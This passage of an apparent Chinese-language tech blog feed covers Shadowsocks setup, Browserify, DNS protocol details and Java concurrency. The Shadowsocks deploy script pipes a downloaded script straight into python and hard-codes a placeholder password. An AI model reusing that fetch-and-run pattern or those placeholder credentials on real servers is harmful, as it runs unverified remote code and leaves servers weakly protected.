        <content type="html"><![CDATA[<h2 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h2><p><img src="/images/whats-shadowsocks.png"></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p><code>ssserver</code> &amp; <code>sslocal</code></p><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ss.json </span><br><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;: &quot;host&quot;,</span><br><span class="line">    &quot;server_port&quot;: 4443,</span><br><span class="line">    &quot;local_port&quot;: 1080,</span><br><span class="line">    &quot;password&quot;: &quot;password&quot;,</span><br><span class="line">    &quot;timeout&quot;: 600,</span><br><span class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssserver -d start -c /etc/ss.json</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sslocal -d start -c /etc/ss.json </span><br><span class="line">-p port</span><br><span class="line">-s server</span><br><span class="line">-k pass</span><br><span class="line">-m encryption</span><br><span class="line">-h help</span><br></pre></td></tr></table></figure><h3 id="部署脚本"><a href="#部署脚本" class="headerlink" title="部署脚本"></a>部署脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">install pip</span> </span><br><span class="line">curl -s &quot;https://bootstrap.pypa.io/get-pip.py&quot; | python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">isntall shadowsocks</span></span><br><span class="line">pip install shadowsocks</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取IP</span></span><br><span class="line">ip=`curl -s https://api.ipify.org`;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端口</span></span><br><span class="line">port=4433</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码</span></span><br><span class="line">pass=&quot;password&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果无法启动尝试绑定服务器IP为0.0.0.0</span></span><br><span class="line">rm -rf /etc/ss.json </span><br><span class="line">touch /etc/ss.json </span><br><span class="line">echo -e &quot;&#123; \n \</span><br><span class="line">    \&quot;server\&quot;: \&quot;$ip\&quot;, \n \</span><br><span class="line">    \&quot;server_port\&quot;: $port, \n \</span><br><span class="line">    \&quot;local_port\&quot;: 1080, \n \</span><br><span class="line">    \&quot;password\&quot;: \&quot;$pass\&quot;, \n \</span><br><span class="line">    \&quot;timeout\&quot;: 600, \n \</span><br><span class="line">    \&quot;method\&quot;: \&quot;aes-256-cfb\&quot; \n \</span><br><span class="line">&#125;&quot; &gt; /etc/ss.json </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">防火墙</span></span><br><span class="line">iptables -I INPUT 1 -p tcp --dport 4433 -j ACCEPT</span><br><span class="line">iptables -I OUTPUT 1 -p tcp --sport 4433 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptable -I INPUT 5 -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">service iptables save</span><br><span class="line">service iptables reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">ssserver -d start -c /etc/ss.json</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/shadowsocks/shadowsocks/wiki">https://github.com/shadowsocks/shadowsocks/wiki</a><br><a href="https://shadowsocks.org/">https://shadowsocks.org/</a><br><a href="https://github.com/shadowsocks">https://github.com/shadowsocks</a><br><a href="https://github.com/shadowsocksr-backup">https://github.com/shadowsocksr-backup</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Browserify</title>
      <link href="/post/browserify.html"/>
      <url>/post/browserify.html</url>
      
        <content type="html"><![CDATA[<h2 id="Browserify"><a href="#Browserify" class="headerlink" title="Browserify"></a>Browserify</h2><p><code>Browserify</code>可以编译<code>node</code>模块让其在浏览器中使用。</p><h3 id="Node-js内置模块的转换"><a href="#Node-js内置模块的转换" class="headerlink" title="Node.js内置模块的转换"></a>Node.js内置模块的转换</h3><p>理想情况下，大部分不涉及io操作的模块可以在浏览器中直接运行。</p><p>对于nodejs内置模块，在require()它们的时候，会被转换成如下模块来打包，以适配浏览器环境。</p><ul><li>assert</li><li>buffer</li><li>console</li><li>constants</li><li>crypto</li><li>domain</li><li>events</li><li>http</li><li>https</li><li>os</li><li>path</li><li>punycode</li><li>querystring</li><li>stream</li><li>string_decoder</li><li>timers</li><li>tty</li><li>url</li><li>util</li><li>vm</li><li>zlib</li></ul><p>另外, 如果是用到了如下5个全局变量，它们会在打包过程中被改写成可以适配浏览器环境的。</p><ul><li>process</li><li>Buffer</li><li>global 全局变量window</li><li>__filename - 文件名</li><li>__dirname - 文件路径</li></ul><ol><li>编译代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify ./math.js -o bundle.js</span><br></pre></td></tr></table></figure><ol start="2"><li>编译成require的形式<blockquote><p>var math &#x3D; require(‘.&#x2F;math.js’);</p></blockquote></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify -r ./math.js -o bundle.js</span><br></pre></td></tr></table></figure><ol start="3"><li>编译成模块的形式<blockquote><p>浏览器里面直接访问math，node环境里面可以require</p></blockquote></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify ./math.js -s math bundle.js</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://zhaoda.net/2015/10/16/browserify-guide/">http://zhaoda.net/2015/10/16/browserify-guide/</a></li><li><a href="https://www.ibm.com/developerworks/cn/web/1501_chengfu_browserify/">https://www.ibm.com/developerworks/cn/web/1501_chengfu_browserify/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> browserify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome使用及配置</title>
      <link href="/post/chrome.html"/>
      <url>/post/chrome.html</url>
      
        <content type="html"><![CDATA[<h3 id="Chrome-使用及配置"><a href="#Chrome-使用及配置" class="headerlink" title="Chrome 使用及配置"></a>Chrome 使用及配置</h3><ol><li>你是不是要访问<code>http://xn--flw351e/</code><br> <img src="/images/QQ20180105-103036@2x.jpg"><br> 产生这个问题的主要原因是因为用户DNS把输入结果解析了，有些私有DNS会不存在的解析的记录解析到公司主页。解决这个问题要么使用公共DNS，要么修改私有DNS配置。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS协议</title>
      <link href="/post/dns.html"/>
      <url>/post/dns.html</url>
      
        <content type="html"><![CDATA[<h3 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h3><p><img src="/images/QQ20180108-121200@2x.jpg"></p><h4 id="头信息"><a href="#头信息" class="headerlink" title="头信息"></a>头信息</h4><p>DNS协议头共12字节，分六大部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                                1  1  1  1  1  1</span><br><span class="line">  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                      ID                       |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    QDCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    ANCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    NSCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br><span class="line">|                    ARCOUNT                    |</span><br><span class="line">+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+</span><br></pre></td></tr></table></figure><ul><li>第一部分2字节(16位)为<code>Transaction Id</code>，用来标识唯一的查询请求（主要应为UDP协议）。</li><li>第二部分2字节为标志位<code>Flags</code>，共16位(bit)。<ul><li>QR(Request&#x2F;response)是1位（bit）字段：0表示查询报文，1表示响应报文。</li><li>opcode 是一个4位字段：通常值为0（标准查询），其他值为1（反向查询）和2（服务器状态请求）。</li><li>AA(Authoritative answer)是1bit标志，表示“授权回答(authoritative answer)”。该名字服务器是授权于该域的。</li><li>TC(Truncation)是1bit字段，表示“可截断的(truncated)”。使用UDP时，它表示当应答的总长度超过512字节时，只返回前512个字节。为1时客户端会重新发起一个TCP DNS查询请求。</li><li>RD(Recursion desired)是1bit字段表示“期望递归（recursion desired）”。该比特能在一个查询中设置，并在响应中返回。</li><li>RA(Recursion available)是1bit字段，表示“可用递归”。如果名字服务器支持递归查询，则在响应中将该比特设置为1。</li><li>Reserved 随后的3bit字段必须为0。</li><li>rcode(Return code)是一个4bit的返回码字段。通常的值为0（没有差错）和3（名字差错）。</li></ul></li><li>第三部分2字节<code>Question Resource Record count</code>(请求和响应)。</li><li>第四部分2字节<code>Answer Resource Record count</code>(响应)。</li><li>第五部分2字节<code>Authority Resource Record count</code>。</li><li>第六部分2字节<code>Additional Resource Record count</code>。</li></ul><h4 id="Question-Resource-Record"><a href="#Question-Resource-Record" class="headerlink" title="Question Resource Record"></a>Question Resource Record</h4><p><img src="/images/QQ20180108-122315@2x.jpg"></p><p>查询问题是一个可变长度的，主要是因为域名长度不固定。<code>Question Resource Record count</code>的数量代表查询问题的数量。查询问题分三部分，一个可变长度的域名，一个2自己的查询类型，一个字节的查询类。</p><ul><li>查询域名结构为长度子域名值  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># www.baidu.com 分三部分。第一部分www长度为3，第二部分baidu长度为5，第三部分www长度为3。最后以为0表示结束。</span><br><span class="line">3www5baidu3com0</span><br></pre></td></tr></table></figure></li><li>查询类型2字节，主要有<code>A</code>、<code>MX</code>、<code>CNAME</code>等。</li><li>查询类2字节互联网应用都为1。</li></ul><h4 id="Answer-Resource-Record、Authority-Resource-Record、Additional-Resource-Record"><a href="#Answer-Resource-Record、Authority-Resource-Record、Additional-Resource-Record" class="headerlink" title="Answer Resource Record、Authority Resource Record、Additional Resource Record"></a>Answer Resource Record、Authority Resource Record、Additional Resource Record</h4><p><img src="/images/QQ20180108-123107@2x.jpg">  </p><p>这三部分结构类似，简称<code>Resource Record (RR)</code>，共六大部分。</p><ul><li>第一部分为可变长度的域名。域名部分和查询部分域数据格式一样<code>长度-域名值</code>，不同的一点是此处域名可以压缩。如果第一个长度位前2字节为<code>11</code>表示后面的数据不再是数据长度，而是一个引用地址。引用地址为域名部分前2位（16字节）中除去前2位<code>11</code>剩下的14个位，它的的十进制数表示偏移位（一般为<code>c0 0c</code>，因为DNS报文12字节固定头，后面紧跟着就是查询问题的域名部分。12的二进制形式为<code>00001100</code>，完整的二进制位<code>11000000 00001100</code>，十六进制形式即为<code>c0 0c</code>）。    </li><li>第二三部分查询域名、查询类，各2字节。同<code>Question Resource Record</code>记录格式。</li><li>第四部分生存时间(Time-to-Live ttl)共4字节(32bit)形式。</li><li>第五部分2字节表示剩下部分的数据长度。</li><li>第六部分为数据，不同的Resource Record区别主要在第六部分数据。</li></ul><p><a href="https://github.com/tianyk/mini-dns">代码实现</a></p><blockquote><p>通过Wireshark抓取的网络包<br><img src="/images/QQ20180108-125622@2x.jpg"></p></blockquote><h3 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h3><p><img src="/images/dns.png"></p><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><blockquote><p>yum install bind-utils</p></blockquote><ol><li>dig <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @114.114.114.114 www.baidu.com A</span><br></pre></td></tr></table></figure></li><li>nslookup  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure></li></ol><h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><ol><li>Mac <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lookupd -flushcache 这个命令适用于Tiger或更低版本 Mac OS</span><br><span class="line">dscacheutil -flushcache 这个适用于Mac OS Leopard </span><br></pre></td></tr></table></figure></li><li>Linux  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nscd reload</span><br></pre></td></tr></table></figure></li><li>Windows  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure></li><li>Chrome  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chrome://net-internals/#dns</span><br><span class="line">chrome://net-internals/#sockets</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://linux.cn/article-3341-1.html">如何在 Linux&#x2F;Unix&#x2F;Mac 下清除 DNS 查询缓存</a></li><li><a href="/2017/08/31/dig/">dig</a></li><li><a href="http://docs.52im.net/extend/docs/book/tcpip/vol1/14/">TCP&#x2F;IP详解 卷1：协议</a></li><li>网络是怎样连接的</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> dig </tag>
            
            <tag> nslookup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java并发</title>
      <link href="/post/java.util.concurrent.html"/>
      <url>/post/java.util.concurrent.html</url>
      
        <content type="html"><![CDATA[<h2 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h2><p>多线程在多核心机器中能减少资源浪费，充分利用多核性能。在单核心机器中能提高吞吐率。</p><p><code>可见性</code>和<code>指令重排</code>是编发编程中出现问题的原因所在。Java内存模型分为<code>主内存</code>和<code>工作内存</code>两部分。JMM规定，线程写值时只能写到<code>工作内存</code>，不能直接写到<code>主内存</code>。JVM定期（内存屏障）将<code>工作内存</code>的值刷会主内存。同样，读取<code>共享变量</code>的值时只能从<code>工作内存</code>中读取，<code>工作内存</code>不能直接读取<code>主内存</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoViisibility</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> ready;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReaderThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (!ready) Thread.<span class="keyword">yield</span>();</span><br><span class="line">            System.out.println(number);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 由于指令重排，下面三行代码可能会以任意顺序执行。指令重排的前提是不会影响逻辑正确性。</span></span><br><span class="line"><span class="comment">         * 由于内存屏蔽，修改number、ready的值后子线程不一定能获取到最新的值。</span></span><br><span class="line"><span class="comment">         * 可能出现的结果：</span></span><br><span class="line"><span class="comment">         * 1. 由于读取不到number的值可能一直循环下去 （由于指令重排，此时的值可能是42也可能是0）</span></span><br><span class="line"><span class="comment">         * 2. 读取到了number输出是0</span></span><br><span class="line"><span class="comment">         * 3. 输出42</span></span><br><span class="line"><span class="comment">         * 注意：单线程环境下指令重排也会有，因为每次读取的都是线程内缓存所以不会出现读不到最新值的情况。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReaderThread</span>().start();</span><br><span class="line">        number = <span class="number">42</span>;</span><br><span class="line">        ready = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h3><p>Java有<code>工作内存</code>和<code>主内存</code>，工作内存要定期将内容刷回主内存才能保证可见。那什么时候刷回去呢？在Java里面遇到内存屏障指令时就会将工作内存和主内存进行同步。例如，我们使用<code>synchronized</code>可以保证可见性，这是因为在<code>synchronized</code>代码块的第一行和最后一行会插入内存屏障，进入<code>synchronized</code>代码块时会从主内存获取一遍变量，退出<code>synchronized</code>代码块时会将工作内存刷回主存。</p><h3 id="synchronized与volatile"><a href="#synchronized与volatile" class="headerlink" title="synchronized与volatile"></a>synchronized与volatile</h3><p><code>synchronized</code>能保证可见性和原子性，<code>volatile</code>只能保证可见性。看下面的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@NotThreadSafe</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上例不是并发安全的。虽然我们能看到<code>count</code>的新值，但是<code>count++</code>是一个符合操作。要将<code>incr</code>变为原子操作只能使用<code>synchronized</code>关键字。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ThreadSafe</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>volatile</code>一般应用在标志位变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Loop</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> shutdown;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(!shutdown) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shutdown</span><span class="params">()</span> &#123;</span><br><span class="line">        shutdown = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="并发与同步"><a href="#并发与同步" class="headerlink" title="并发与同步"></a>并发与同步</h3><p>并发程序可以并行执行任务也可以串行来执行。并发是去同时应对多个任务，并行是同时去做多种任务。</p><p>并发在同时应对多种任务时，需要去处理同步的问题。</p><h3 id="并发编程中的问题"><a href="#并发编程中的问题" class="headerlink" title="并发编程中的问题"></a>并发编程中的问题</h3><ul><li><p>死锁</p><p>  根本原因是要获取多把锁，但是不同线程<strong>加锁顺序不同</strong>。</p></li><li><p>饥饿</p><p>  一直等待某种状态。</p></li><li><p>活锁</p><p>  是指线程1可以使用资源，但它很礼貌，让其他线程先使用资源。线程2也可以使用资源，但它很绅士，也让其他线程先使用资源。这样你让我，我让你，最后两个线程都无法使用资源。</p></li></ul><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><ul><li><p>start </p><p>  启动一个线程。</p></li><li><p>run </p><p>  直接在当前线程内运行。可用于线程封装，比如线程池内运行线程可以直接在线程池线程中调用被传入线程的<code>run</code>方法。</p></li><li><p>sleep</p><p>  线程休眠，会释放CPU资源但是不会释放锁。</p></li><li><p>yield </p><p>  短暂让出CPU资源，不像sleep时间结束后进入<code>RUNNABLE</code>状态，它会立即进入<code>RUNNABLE</code>状态等待CPU资源。它同样不会释放锁。</p></li><li><p>join </p><p>  用于线程协调。调用<code>t.join()</code>当前线程会等待线程<code>t</code>执行完再继续执行。</p></li><li><p>interrupt</p><p>  中断，类似一种信号，是一种协商机制。具体查看下面的中断机制。</p></li><li><p>wait、notify&#x2F;notifyAll </p><p>  这两者属于Object类上的方法，用于线程<em>通讯</em>（其实没有讯息，类似一个通知机制）。具体查看下面的内置条件队列。</p></li></ul><h4 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h4><p><img src="/images/thread-state.jpg"></p><h4 id="线程中断"><a href="#线程中断" class="headerlink" title="线程中断"></a>线程中断</h4><p><code>interrupted</code>是一种协商机制，中断机制是一种协作机制，也就是说通过中断并不能直接终止另一个线程，而需要被中断的线程自己处理中断。可以理解为进程通信中的信号，例如<code>kill -n pid</code>。<code>interrupt</code>信号是通知线程应该中断了，具体到底中断还是继续运行，应该由被通知的线程自己处理。</p><ul><li><p>public void interrupt()</p><ul><li><p>将调用者线程的中断状态设为true。</p></li><li><p>被通知中断的线程在阻塞时，会抛出<code>InterruptedException</code>异常，同时<strong>将中断状态修改为false</strong>。</p><p>  如果线程被中断<code>interrupt()</code>后，我们并不想立即中断它那么我们需要重置中断状态为<code>未中断</code>。不然很多依赖中断状态<code>isInterrupted()</code>的方法会出问题。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ... </span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException ignored) &#123;</span><br><span class="line">    <span class="comment">// 重置中断状态为 true</span></span><br><span class="line">    Thread.currentThread().interrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>public boolean isInterrupted() </p><ul><li>判断调用者线程的中断状态。</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isInterrupted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> isInterrupted(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>public static boolean interrupted()</p><ul><li>返回当前线程的中断状态</li><li>将当前线程的中断状态设为false</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Tests if some Thread has been interrupted.  The interrupted state</span></span><br><span class="line"><span class="comment">* is reset or not based on the value of ClearInterrupted that is</span></span><br><span class="line"><span class="comment">* passed.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> ClearInterrupted 是否清除中断状态</span></span><br><span class="line"><span class="comment">* 清除中断状态</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">isInterrupted</span><span class="params">(<span class="type">boolean</span> ClearInterrupted)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">interrupted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentThread().isInterrupted(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 